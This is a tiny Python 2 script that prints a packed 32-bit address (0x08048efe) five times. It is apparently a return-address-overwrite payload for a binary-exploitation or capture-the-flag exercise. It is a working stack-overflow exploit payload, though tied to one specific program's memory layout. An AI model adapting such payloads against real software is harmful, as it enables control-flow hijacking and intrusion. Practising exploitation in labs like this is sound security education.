from struct import pack

def main():
	print pack("<I", 0x08048efe)*5

if __name__ == '__main__':
	main()
